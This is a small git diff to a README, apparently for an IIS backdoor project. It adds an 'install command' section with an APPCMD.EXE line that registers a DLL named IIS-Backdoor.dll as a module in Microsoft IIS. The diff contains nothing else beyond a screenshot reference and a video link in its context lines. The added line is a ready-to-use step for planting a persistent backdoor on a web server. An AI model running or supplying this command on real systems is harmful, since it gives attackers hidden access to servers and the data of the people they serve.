@@ -49,6 +49,7 @@ https://www.youtube.com/watch?v=jbxEWOXecuU&feature=youtu.be
 
 ![options](images/screenshot.png)
 
+### install command
 
-
+`C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true`
 
